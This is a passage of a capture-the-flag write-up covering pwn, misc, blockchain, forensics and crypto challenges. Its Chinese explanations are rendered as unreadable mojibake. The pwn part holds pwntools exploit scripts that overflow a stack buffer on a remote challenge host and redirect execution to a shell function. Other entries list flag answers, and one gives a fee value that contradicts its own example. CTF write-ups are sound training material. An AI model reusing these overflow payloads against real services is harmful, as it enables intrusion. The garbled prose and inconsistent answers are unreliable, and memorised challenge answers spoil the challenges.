</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;geek.ctfplus.cn&#39;</span><span class="p">,</span><span class="mi">30575</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#io=process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">shell_addr</span><span class="o">=</span><span class="mh">0x00000000004014AB</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;2&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">padding</span><span class="o">=</span><span class="mh">0x20</span><span class="o">+</span><span class="mh">0x8</span>
</span></span><span class="line"><span class="cl"><span class="n">ret_addr</span><span class="o">=</span><span class="mh">0x000000000040101a</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="n">padding</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">shell_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é¢˜è¿˜æœ‰ä¸ªæ³¨æ„çš„æ˜¯ï¼Œç¨‹åºåœ¨readä¹‹å‰æŠŠæ ‡å‡†è¾“å‡ºæ–‡ä»¶å…³äº†ï¼Œæ‰€æœ‰åœ¨äº¤äº’çš„æ—¶å€™è¦æƒ³è·å¾—flagå°±éœ€è¦é‡å®šå‘ä¸€ä¸‹æ‰å¯ä»¥è·å¾—flag</p>
<h3 id="18æ¬¡å…ƒå›šç¬¼">18.æ¬¡å…ƒå›šç¬¼
</h3><p>æ‰“å¼€idaçœ‹mainå‡½æ•°</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="n">__noreturn</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-4h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="nf">init</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">menu</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">!=</span> <span class="mi">3</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nf">love_me</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">&lt;=</span> <span class="mi">3</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">miss_me</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">==</span> <span class="mi">2</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">abandon_me</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>é€šè¿‡readå‡½æ•°æ‰¾æº¢å‡ºç‚¹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">leave</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">dest</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-20h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="nf">strcpy</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="nf">strcmp</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="s">&#34;love&#34;</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;it&#39;s all of you&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;yes I wait for you forever&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mh">0x100uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¦è¿›å…¥è¿™ä¸ªå‡½æ•°è¦å…ˆè¿›å…¥abandon_me()å‡½æ•°ä¸­</p>
<p>æ‰€ä»¥æ ¹æ®è¿è¡Œé€»è¾‘å°±å¯ä»¥æ„é€ å‡ºæ¯ä¸€æ¬¡çš„å‘é€ï¼Œexpå¦‚ä¸‹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io=process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s2">&#34;geek.ctfplus.cn&#34;</span><span class="p">,</span><span class="mi">30174</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">last_addr</span><span class="o">=</span><span class="mh">0x4012bb</span>
</span></span><span class="line"><span class="cl"><span class="n">padding</span><span class="o">=</span><span class="mi">32</span><span class="o">+</span><span class="mi">8</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="n">padding</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">last_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;step&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h1 id="misc">misc
</h1><h3 id="19">19.ğŸ—ƒï¸ğŸ—ƒï¸
</h3><p>é€šè¿‡æœç´¢å¼•æ“æœç´¢å¯çŸ¥æ˜¯åŒ—äº¬å¤©å›å…¬å›­</p>
<p>æŒ‰æ ¼å¼ä¸Šäº¤å¯å¾—flag</p>
<h3 id="20bite-off-picture">20.Bite off picture
</h3><p>ä¸‹è½½é™„ä»¶è·å¾—ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œç›´æ¥è§£å‹å‘ç°ä¸è¡Œæœ‰å¯†ç ï¼Œæ ¹æ®æç¤ºæ‰“å¼€010ï¼Œæ‹–åˆ°æœ€ä¸‹é¢å‘ç°==gcyV2dyV2dæ˜¯ä¸€ä¸ªå€’ç€çš„base64è½¬ç½®ä¹‹åd2Vyd2Vycg==ï¼Œè§£å¯†å¯å¾—werwerréªŒè¯å‘ç°ç¡®å®ä¸ºè§£å‹å¯†ç ã€‚</p>
<p>è§£å‹åæœ‰ä¸ªwowç…§ç‰‡ï¼Œå…ˆç”¨crcçˆ†ç ´çœ‹çœ‹é•¿å®½æ˜¯å¦æ­£ç¡®</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">binascii</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">crcbp</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;C:</span><span class="se">\\</span><span class="s2">Users</span><span class="se">\\</span><span class="s2">asus</span><span class="se">\\</span><span class="s2">Desktop</span><span class="se">\\</span><span class="s2">geek</span><span class="se">\\</span><span class="s2">week1</span><span class="se">\\</span><span class="s2">misc</span><span class="se">\\</span><span class="s2">wow</span><span class="se">\\</span><span class="s2">wow.png&#34;</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>    <span class="c1">#æ‰“å¼€å›¾ç‰‡</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2000</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2000</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="n">crcbp</span><span class="p">[</span><span class="mi">12</span><span class="p">:</span><span class="mi">16</span><span class="p">]</span> <span class="o">+</span> \
</span></span><span class="line"><span class="cl">            <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&gt;i&#39;</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&gt;i&#39;</span><span class="p">,</span> <span class="n">j</span><span class="p">)</span><span class="o">+</span><span class="n">crcbp</span><span class="p">[</span><span class="mi">24</span><span class="p">:</span><span class="mi">29</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">crc32</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">crc32</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">crc32</span> <span class="o">==</span> <span class="mh">0x512BD96F</span><span class="p">):</span>    <span class="c1">#å›¾ç‰‡å½“å‰CRC</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;hex:&#39;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">i</span><span class="p">),</span> <span class="nb">hex</span><span class="p">(</span><span class="n">j</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿è¡Œç»“æœ</p>
<p>1002 956
hex: 0x3ea 0x3bc</p>
<p>åœ¨æ‰“å¼€010ï¼Œå‘ç°é•¿å®½ç¡®å®ä¸å¯¹ï¼Œä¿®æ”¹ä¹‹åå³å¯å¾—åˆ°æ­£ç¡®çš„å›¾ç‰‡ï¼Œä»ä¿®æ­£åçš„å›¾ç‰‡å¯ä»¥çœ‹åˆ°flagSYC{mi3c_13_really_fun!!!!!}</p>
<h3 id="21blockchain-signin">21.Blockchain SignIn
</h3><p>å…ˆåœ¨ä»¥å¤ªåŠæŸ¥è¯¢è¯¥äº¤æ˜“</p>
<p>æ‰¾åˆ°inputdataå†…å®¹0x5359437b773362335f67346d335f73743472747d</p>
<p>ç›´æ¥å¯¹åº”ASCIIè½¬åŒ–å¯å¾—åˆ°</p>
<p>SYC{w3b3_g4m3_st4rt}</p>
<h3 id="221z_sign">22.1Z_Sign
</h3><ol>
<li>æ‰“å¼€ <a class="link" href="https://etherscan.io/tx/0x1d3040872d9c3d15d47323996926c2aa5c7b636fc7209f701301878dcf438598"  target="_blank" rel="noopener"
    >Etherscanäº¤æ˜“é¡µé¢</a></li>
<li>å‘ä¸‹æ»šåŠ¨åˆ°&quot;Logs&quot;éƒ¨åˆ†</li>
<li>å¯»æ‰¾&quot;Pool Created&quot;æˆ–ç±»ä¼¼äº‹ä»¶</li>
<li>æŸ¥çœ‹äº‹ä»¶å‚æ•°ï¼Œæ‰¾åˆ°feeå€¼</li>
<li>å°†feeè½¬æ¢ä¸ºé¢˜ç›®è¦æ±‚çš„æ ¼å¼
<ul>
<li><code>SYC{0.3%}</code>ï¼ˆå¦‚æœfee=3000ï¼‰</li>
</ul>
</li>
</ol>
<p><img src="C:%5cUsers%5casus%5cDesktop%5cgeek%5cweek1%5cmisc%5cizsign%5cf0c1e938-4db6-4591-a290-04daf2bd102a.png"
	
	
	
	loading="lazy"
	
		alt="f0c1e938-4db6-4591-a290-04daf2bd102a"
	
	
></p>
<p>æ‰€ä»¥flagæ˜¯SYC{0.99%}</p>
<h3 id="23dream">23.Dream
</h3><p>ç›´æ¥æŸ¥æ‰¾åˆçº¦ä»£ç æ®µï¼ŒæŸ¥çœ‹å¯ç–‘æ•°æ®å°±å¯ä»¥è·å¾—flag</p>
<h3 id="24hidden">24.hidden
</h3><p>è¿™ä¸ªflagè¢«æ‹†æˆäº†ä¸‰æ®µ</p>
<p>ç¬¬ä¸€æ®µåœ¨wordæ–‡æ¡£é‡Œï¼Œåœ¨æœç´¢æ¡†ä¸­æœç´¢éšè—æ®µè½æ ‡è®°ï¼ŒæŠŠå®ƒæ‰“å¼€ï¼Œä¹‹åå¯ä»¥çœ‹åˆ°ç¬¬ä¸€ä¸ªflagï¼šSYC{adsad</p>
<p>æ ¹æ®æç¤ºwordçš„æœ¬è´¨æ˜¯ä»€ä¹ˆï¼Ÿå¯çŸ¥ä¸‹ä¸€æ­¥éœ€è¦è®²æ–‡ä»¶æ ¼å¼æ”¹ä¸ºzipæ ¼å¼ï¼Œä¿®æ”¹è§£å‹ååœ¨docæ–‡ä»¶ä¸­å¯ä»¥æ‰¾åˆ°flag3ï¼šsjdmd}</p>
<p>åœ¨æ—è¾¹çš„.textæ–‡ä»¶é‡Œæœ‰ä¸€ä¸ªbase64ç¼–ç ï¼Œè§£å¯†ä¹‹åå¯å¾—362geydgwunkdwee</p>
<p>æœ€ç»ˆå°†3ä¸ªflagæ‹¼æ¥å¯å¾—æœ€ç»ˆflagï¼šSYC{adsad362geydgwunkdweesjdmd}</p>
<h3 id="25gift">25.gift
</h3><p>ä¾æ—§è·å¾—ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œä¾æ—§éœ€è¦å¯†ç ï¼Œæ‰“å¼€010å‘ç°å¯†ç å°±åœ¨æœ€ä¸‹é¢ZzFmdA==ï¼Œè§£ç å¯å¾—g1ftï¼Œè§£å‹ä¹‹åæœ‰ä¸€ä¸ªåä¸ºwatermark.BMPçš„å›¾ç‰‡ï¼Œæ ¹æ®æç¤ºæœç´¢watermarkè½¯ä»¶ï¼Œå³å¯è·å¾—flag SYC{IT3_gift-f0r-you}</p>
<h3 id="264ak5ra">26.4ak5ra
</h3><p>è·å¾—ä¸€ä¸ªå‹ç¼©åŒ…æ­£å¸¸è§£å‹æ— å¯†ç ï¼Œè·å¾—ä¸€ä¸ªæç¤ºå’Œä¸€ä¸ªå›¾ç‰‡ï¼Œæç¤ºæˆ‘ä»¬éœ€è¦æ‰¾åˆ°åŸå¤´åƒï¼Œè¿™ä¸ªå¤´åƒå¤§æ¦‚ç‡æ˜¯è—åœ¨ç°åœ¨çš„å¤´åƒä¸­ï¼Œç„¶åå°è¯•åˆ†ç¦»æ–‡ä»¶ï¼Œå‘ç°ç¡®å®åˆ†ç¦»å‡ºä¸€ä¸ªå›¾ç‰‡ï¼Œåœ¨æ ¹æ®ä¸»é¢˜ç›®æç¤ºçš„LSBï¼Œå¯¹åŸå¤´åƒä½¿ç”¨å¯å¾—ï¼Œflagï¼šSYC{Im_waiting_for_Sakura_t0_become_a_top_pwn_master}</p>
<h3 id="27é—®å·">27.é—®å·
</h3><p>ç›´æ¥å¡«å†™é—®å·å³å¯è·å¾—flag</p>
<h3 id="28http">28.HTTP
</h3><p>1.ä¸‹è½½é™„ä»¶ï¼Œæ–‡ä»¶æ˜¯ traffic (1).pcapng ï¼Œæ˜¯ç½‘ç»œæµé‡åŒ…æ–‡ä»¶ï¼Œç”¨Wiresharkæ‰“å¼€</p>
<p>2.è¿‡æ»¤httpåè®®ï¼Œå®šä½httpåŒ…
3.æå–httpåŒ…æ•°æ®æ®µï¼Œé‡ç‚¹çœ‹httpè¯·æ±‚å’Œå“åº”çš„bodyã€‚æ­¤é¢˜æ­£å¥½è—åœ¨GET /pixel.gif?d=&hellip;é‡Œçš„då‚æ•°ï¼ŒæŸ¥çœ‹å®Œæ•´å†…å®¹
4.è§£ç å‘ç°æ‰€å¾—ç›®æ ‡ä¿¡æ¯ä¸å®Œæ•´ï¼Œç»§ç»­æŸ¥çœ‹å…¶ä»–å‡ æ®µå‚æ•°ï¼Œæ‹¼æ¥å¾—d=U1lDe1JfVV9BXw==RjBSM05TMUM1X01BU1RFUj99
5.è§£ç è·å¾—flagï¼šSYC{R_U_A_F0R3NS1C5_MASTER?}</p>
<h1 id="crypto">Crypto
</h1><h3 id="29ez_xor">29.ez_xor
</h3><p>è¿™æ˜¯ä¸€é“åŸºäº RSA çš„å¯†ç å­¦é¢˜ç›®ï¼Œæ ¸å¿ƒè€ƒç‚¹æ˜¯åˆ©ç”¨<strong>æ•°è®ºæ€§è´¨</strong>åˆ†è§£ RSA çš„æ¨¡æ•°å› å­ï¼š</p>
<ol>
<li><strong>åˆ†è§£ p å’Œ q</strong>ï¼šå·²çŸ¥<code>n=p*q</code>å’Œ<code>gift=p^q</code>ï¼ˆå¼‚æˆ–ï¼‰ï¼Œåˆ©ç”¨å…¬å¼ <code>p*q = [(p+q)/2]^2 - [(p^q)/2]^2</code> æ±‚è§£<code>p+q</code>ï¼Œè¿›è€Œåˆ†è§£<code>p</code>å’Œ<code>q</code>ã€‚</li>
<li><strong>åˆ†è§£ s å’Œ r</strong>ï¼šå·²çŸ¥<code>gift1=s&amp;r</code>ï¼ˆä¸ï¼‰ã€<code>gift2=s^r</code>ï¼ˆå¼‚æˆ–ï¼‰ï¼Œåˆ©ç”¨å…¬å¼ <code>s+r = (s^r) + 2*(s&amp;r)</code> å¾—åˆ°<code>s+r</code>ï¼Œç»“åˆ<code>N/n=s*r</code>æ±‚è§£<code>s</code>å’Œ<code>r</code>ã€‚</li>
<li><strong>RSA è§£å¯†</strong>ï¼šå¾—åˆ°æ‰€æœ‰ç´ å› å­åï¼Œè®¡ç®—æ¬§æ‹‰å‡½æ•°<code>Ï†(N)</code>ï¼Œæ±‚ç§é’¥<code>d</code>å¹¶è§£å¯†ã€‚</li>
</ol>
<p>expå¦‚ä¸‹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">long_to_bytes</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">gmpy2</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ç»™å®šæ•°æ®</span>
